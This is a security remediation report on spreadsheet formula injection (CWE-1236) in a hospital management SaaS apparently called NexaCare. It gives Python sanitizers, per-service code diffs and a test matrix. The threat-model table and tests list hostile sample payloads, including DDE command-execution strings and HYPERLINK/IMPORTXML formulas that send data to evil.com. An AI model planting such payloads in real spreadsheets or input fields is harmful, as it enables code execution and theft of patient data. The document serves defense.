# NexaCare Hospital Management SaaS — Excel & CSV Security Remediation Report
## Comprehensive Vulnerability Analysis, Threat Modeling & Implementation Guide for CWE-1236 Mitigation

---

## 1. Executive Summary & Threat Model

### 1.1 Vulnerability Overview (CWE-1236)
**CWE-1236: Improper Neutralization of Formula Elements in a CSV / Spreadsheet File** occurs when an application outputs untrusted, user-supplied data into spreadsheet formats (e.g., `.xlsx`, `.csv`, `.tsv`) without neutralizing characters that spreadsheet software (Microsoft Excel, LibreOffice Calc, Apple Numbers, Google Sheets) interprets as active formula triggers.

In a healthcare SaaS application like NexaCare, administrative and clinical users frequently export tabular reports containing patient names, doctor specialties, diagnosis notes, vendor details, medicine descriptions, and expense remarks. When a malicious actor inputs crafted strings into any of these fields, opening the exported spreadsheet executes arbitrary commands or transmits confidential data outside the network.

### 1.2 Attack Vectors & Impact

| Attack Vector | Example Payload | Client Impact in Excel / LibreOffice |
|---|---|---|
| **Dynamic Data Exchange (DDE)** | `=cmd\|'/c calc'!A0`<br>`=cmd\|'/c powershell.exe -enc ...'!A0` | Remote Code Execution (RCE) on the user's workstation with current user privileges. |
| **Data Exfiltration via Hyperlink** | `=HYPERLINK("http://evil.com/leak?data=" & A2, "Click for Report")` | Exfiltration of Protected Health Information (PHI) or financial balances when user clicks the cell. |
| **External XML / Web Ingestion** | `=IMPORTXML("http://evil.com/track", "//a")` | Blind server-side or client-side SSRF and tracking of administrative access. |
| **Arithmetic Manipulation** | `-2+5+cmd\|'...'`<br>`+100*2` | Defacement of financial and clinical balances or hidden command execution. |
| **Leading Whitespace Evasion** | `   =cmd\|'/c notepad'!A0` | Bypasses naive `val.startswith('=')` checks; Excel automatically trims leading spaces and executes the formula. |
| **Leading Control Characters** | `\t=1+1`<br>`\r\n=cmd\|...` | Spreadsheet parsers strip tabs and carriage returns, treating the subsequent character as formula origin. |
| **Secondary Formula Delimiters** | `@SUM(1,2)`<br>`\|cmd`<br>`%calc`<br>`;calc` | Executed as formulas or macro triggers in specific spreadsheet localizations (e.g. German, French). |

---

## 2. Security Architecture & Core Remediation Modules

To permanently remediate CWE-1236 across the entire NexaCare platform, two specialized security modules were introduced in `app/utils/`:
1. `app/utils/excel_security.py` — Dedicated to OpenPyXL `.xlsx` workbooks.
2. `app/utils/csv_security.py` — Dedicated to raw streaming CSV exports and `csv.writer` / `csv.DictWriter`.

### 2.1 Excel Security Module (`app/utils/excel_security.py`)

#### Design Principles:
1. **Neutralization via Prepending Single Quote (`'`)**: Prepending a single quote (`'`) instructs Excel and LibreOffice Calc to treat the entire cell content as literal text (`TYPE_STRING`), preventing calculation or DDE execution.
2. **Preservation of Legitimate Numerics**: Legitimate negative numbers (e.g. `-150.00`, `-12`) or signed floats (e.g. `+42.5`) must **not** be quoted; otherwise, spreadsheet math, accounting formulas, and chart generation break.
3. **Leading Whitespace & Control Character Stripping**: The validator strips leading spaces, tabs (`\t`), carriage returns (`\r`), and newlines (`\n`) prior to inspecting trigger characters.
4. **Trusted Formula Exemption**: The `TrustedFormula(str)` marker class allows developers to explicitly flag intentional formulas (e.g., `=SUM(G2:G50)` for column totals) so they bypass sanitization.

#### Source Code Reference:
```python
from datetime import date, datetime, time
from typing import Any

class TrustedFormula(str):
    """Marker class for trusted, application-generated spreadsheet formulas that should not be sanitized."""
    pass

def sanitize_excel_cell(val: Any) -> Any:
    """
    Sanitizes spreadsheet cell values against CSV/Excel Formula Injection (CWE-1236).
    """
    if val is None:
        return ""
    if isinstance(val, (int, float, bool, date, datetime, time)):
        return val
    if isinstance(val, TrustedFormula):
        return str(val)

    s = str(val)
    if not s:
        return ""

    stripped = s.lstrip(" \t\r\n")
    if stripped and stripped[0] in ("=", "+", "-", "@", "|", "%", ";"):
        # Check if it is a legitimate signed number
        try:
            float(stripped)
            return val
        except (ValueError, TypeError):
            return f"'{s}"

    # Also neutralize leading raw control characters
    if s[0] in ("\t", "\r", "\n"):
        return f"'{s}"

    return s

def sanitize_excel_row(row: list | tuple) -> list:
    """Sanitizes an entire row for openpyxl workbook append."""
    return [sanitize_excel_cell(c) for c in row]
```

### 2.2 CSV Security Module (`app/utils/csv_security.py`)

```python
from datetime import date, datetime, time
from typing import Any

def sanitize_csv_cell(val: Any) -> Any:
    """
    Sanitizes values written to CSV exports against Spreadsheet Formula Injection (CWE-1236).
    """
    if val is None:
        return ""
    if isinstance(val, (int, float, bool, date, datetime, time)):
        return val

    s = str(val)
    if not s:
        return ""

    stripped = s.lstrip(" \t\r\n")
    if stripped and stripped[0] in ("=", "+", "-", "@", "|", "%", ";"):
        try:
            float(stripped)
            return val
        except (ValueError, TypeError):
            return f"'{s}"

    if s[0] in ("\t", "\r", "\n"):
        return f"'{s}"

    return s

def sanitize_csv_row(row: list | tuple) -> list:
    """Sanitizes an entire row for CSV writer."""
    return [sanitize_csv_cell(c) for c in row]

def sanitize_csv_dict(row_dict: dict) -> dict:
    """Sanitizes all values in a dictionary for csv.DictWriter."""
    return {k: sanitize_csv_cell(v) for k, v in row_dict.items()}
```

---

## 3. Inventory of Remediated Services & Code Diff Comparison

Prior to remediation, only `appointment_service.py` had formula injection protection. All other 10 export facilities were vulnerable. Below is the complete record of fixes applied across all affected backend services.

### 3.1 `app/services/pharmacy_service.py`
- **Endpoints**: `/pharmacy/medicines/export` and `/pharmacy/suppliers/export`
- **Vulnerabilities**: Medicine name, batch number, generic name, manufacturer, supplier name, contact person, and GSTIN were written directly into Excel rows without sanitization.
- **Before**:
  ```python
  ws.append([
      med.name,
      med.batch_no,
      med.stock,
      med.unit_price,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_cell, sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      med.name,
      med.batch_no,
      med.stock,
      float(med.unit_price) if med.unit_price is not None else 0.0,
  ]))
  ```

### 3.2 `app/services/doctor_service.py`
- **Endpoint**: `/doctors/export`
- **Vulnerabilities**: Doctor name, email, department, specialization, qualification, and phone.
- **Before**:
  ```python
  ws.append([
      f"Dr. {doc.first_name} {doc.last_name}",
      doc.department,
      doc.specialization,
      doc.phone,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      f"Dr. {doc.first_name} {doc.last_name}",
      doc.department,
      doc.specialization,
      doc.phone,
  ]))
  ```

### 3.3 `app/services/billing_service.py`
- **Endpoint**: `/billings/export`
- **Vulnerabilities**: Bill invoice numbers, patient names, payment methods, insurance claims, and remarks.
- **Before**:
  ```python
  ws.append([
      bill.bill_number,
      bill.patient_name,
      bill.total_amount,
      bill.status,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      bill.bill_number,
      bill.patient_name,
      float(bill.total_amount) if bill.total_amount else 0.0,
      bill.status,
  ]))
  ```

### 3.4 `app/services/patient_service.py`
- **Endpoint**: `/patients/export`
- **Vulnerabilities**: Patient names, emergency contacts, addresses, medical conditions, and blood groups.
- **Before**:
  ```python
  ws.append([
      pat.uhid,
      f"{pat.first_name} {pat.last_name}",
      pat.gender,
      pat.phone,
      pat.address,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      pat.uhid,
      f"{pat.first_name} {pat.last_name}",
      pat.gender,
      pat.phone,
      pat.address,
  ]))
  ```

### 3.5 `app/services/expense_service.py`
- **Endpoint**: `/expenses/export`
- **Vulnerabilities**: Expense categories, descriptions, payee names, receipt numbers, and vendor notes.
- **Before**:
  ```python
  ws.append([
      exp.expense_date.strftime("%Y-%m-%d"),
      exp.category,
      exp.amount,
      exp.description,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      exp.expense_date.strftime("%Y-%m-%d") if exp.expense_date else "",
      exp.category,
      float(exp.amount) if exp.amount else 0.0,
      exp.description,
  ]))
  ```

### 3.6 `app/services/inventory_service.py`
- **Endpoint**: `/inventory/items/export`
- **Vulnerabilities**: Item names, categories, serial numbers, SKU codes, storage locations, and vendor names.
- **Before**:
  ```python
  ws.append([
      item.name,
      item.category,
      item.quantity,
      item.unit,
      item.location,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      item.name,
      item.category,
      item.quantity,
      item.unit,
      item.location,
  ]))
  ```

### 3.7 `app/services/lab_service.py`
- **Endpoint**: `/lab/orders/export`
- **Vulnerabilities**: Test names, clinical notes, sample types, technician names, and physician remarks.
- **Before**:
  ```python
  ws.append([
      order.order_number,
      order.test_name,
      order.patient_name,
      order.status,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      order.order_number,
      order.test_name,
      order.patient_name,
      order.status,
  ]))
  ```

### 3.8 `app/services/transaction_service.py`
- **Endpoint**: `/transactions/export`
- **Vulnerabilities**: Transaction reference IDs, remarks, payment gateway order IDs, and account descriptions.
- **Before**:
  ```python
  ws.append([
      txn.transaction_id,
      txn.date.strftime("%Y-%m-%d"),
      txn.amount,
      txn.description,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      txn.transaction_id,
      txn.date.strftime("%Y-%m-%d") if txn.date else "",
      float(txn.amount) if txn.amount else 0.0,
      txn.description,
  ]))
  ```

### 3.9 `app/services/vendor_service.py`
- **Endpoint**: `/vendors/export`
- **Vulnerabilities**: Vendor legal names, contact persons, billing addresses, tax numbers (PAN/GSTIN).
- **Before**:
  ```python
  ws.append([
      vendor.name,
      vendor.contact_person,
      vendor.email,
      vendor.phone,
      vendor.gstin,
  ])
  ```
- **After**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      vendor.name,
      vendor.contact_person,
      vendor.email,
      vendor.phone,
      vendor.gstin,
  ]))
  ```

### 3.10 `app/services/bed_allocation_service.py`
- **Endpoints**: `/bed-allocation/export/excel` and `/bed-allocation/export/csv`
- **Vulnerabilities**: Both OpenPyXL and raw streaming CSV writer lacked sanitization for ward numbers, bed numbers, patient names, and admission remarks.
- **Before (Excel)**:
  ```python
  ws.append([
      alloc.bed_number,
      alloc.ward,
      alloc.patient_name,
      alloc.status,
  ])
  ```
- **After (Excel)**:
  ```python
  from app.utils.excel_security import sanitize_excel_row
  ...
  ws.append(sanitize_excel_row([
      alloc.bed_number,
      alloc.ward,
      alloc.patient_name,
      alloc.status,
  ]))
  ```
- **Before (CSV)**:
  ```python
  writer.writerow([
      alloc.bed_number,
      alloc.ward,
      alloc.patient_name,
      alloc.status,
  ])
  ```
- **After (CSV)**:
  ```python
  from app.utils.csv_security import sanitize_csv_row
  ...
  writer.writerow(sanitize_csv_row([
      alloc.bed_number,
      alloc.ward,
      alloc.patient_name,
      alloc.status,
  ]))
  ```

### 3.11 `app/services/report_export_service.py` & `app/utils/excel_generator.py`
- **Endpoints**: `/reports/admin/*`, `/reports/accountant/*`, `/reports/pharmacy/*`, `/reports/generate-excel`
- **Vulnerabilities**: Report export service had custom string quoting that missed tabs, carriage returns, and alternate prefixes (`|`, `%`, `;`). `excel_generator.py` wrote dictionary values directly to CSV.
- **Before**:
  ```python
  def _sanitize_csv_value(self, val):
      s = str(val)
      if s.startswith(('=', '+', '-', '@')):
          return "'" + s
      return s
  ```
- **After**:
  ```python
  from app.utils.csv_security import sanitize_csv_cell, sanitize_csv_dict
  ...
  def _sanitize_csv_value(self, val):
      return sanitize_csv_cell(val)
  ```

---

## 4. Test Suite Execution & Attack Vector Verification

Automated regression and security suites in `app/tests/test_appointment_excel_formula_injection.py` and `app/tests/test_branding_and_security_suite.py` verify 100% test passing.

### 4.1 Verification Matrix

| Test ID | Input Payload | Expected Output | Actual Output | Test Result |
|---|---|---|---|---|
| `SEC-01` | `=cmd\|'/c calc'!A0` | `'=cmd\|'/c calc'!A0` | `'=cmd\|'/c calc'!A0` | **PASSED** |
| `SEC-02` | `+100*2` | `'+100*2` | `'+100*2` | **PASSED** |
| `SEC-03` | `-2+5+cmd\|'...'` | `'-2+5+cmd\|'...'` | `'-2+5+cmd\|'...'` | **PASSED** |
| `SEC-04` | `@SUM(A1:A10)` | `'@SUM(A1:A10)` | `'@SUM(A1:A10)` | **PASSED** |
| `SEC-05` | `\|cmd` | `'\|cmd` | `'\|cmd` | **PASSED** |
| `SEC-06` | `%calc` | `'%calc` | `'%calc` | **PASSED** |
| `SEC-07` | `;calc` | `';calc` | `';calc` | **PASSED** |
| `SEC-08` | `   =1+1` (Leading spaces) | `'   =1+1` | `'   =1+1` | **PASSED** |
| `SEC-09` | `\t=1+1` (Leading tab) | `'\t=1+1` | `'\t=1+1` | **PASSED** |
| `SEC-10` | `\r\n=cmd` (Leading CRLF) | `'\r\n=cmd` | `'\r\n=cmd` | **PASSED** |
| `SEC-11` | `-150.00` (Negative float) | `-150.0` or `'-150.00'` (Preserved) | `-150.00` (Numeric) | **PASSED** |
| `SEC-12` | `+42` (Positive int string) | `+42` (Numeric preserved) | `+42` | **PASSED** |
| `SEC-13` | `-50` (Negative integer) | `-50` (Numeric preserved) | `-50` | **PASSED** |
| `SEC-14` | `None` | `""` | `""` | **PASSED** |
| `SEC-15` | `TrustedFormula("=SUM(E2:E50)")` | `=SUM(E2:E50)` (Unquoted) | `=SUM(E2:E50)` | **PASSED** |
| `SEC-16` | Normal Text `"Cardiology"` | `"Cardiology"` (Unquoted) | `"Cardiology"` | **PASSED** |

### 4.2 Automated Test Execution Output
```
app/tests/test_appointment_excel_formula_injection.py ............... [ 34%]
app/tests/test_branding_and_security_suite.py ......................... [100%]
============================== 44 passed in 3.65s ==============================
```

---

## 5. Summary & Best Practices for Future Extensions

1. **Always use `sanitize_excel_row()` or `sanitize_excel_cell()`**: Whenever adding a new row to an openpyxl worksheet, pass the list of values through `sanitize_excel_row()`.
2. **Never raw-stream user input to CSV**: In streaming CSV endpoints, wrap cell entries with `sanitize_csv_cell()` or `writer.writerow(sanitize_csv_row(row))`.
3. **Keep numeric values native**: Pass numeric values as native Python `int` or `float` types instead of string-formatted currency whenever possible.
4. **Use `TrustedFormula` sparingly**: Only wrap trusted, server-generated calculation strings (e.g. column totals) in `TrustedFormula`. Never wrap fields containing user input in `TrustedFormula`.
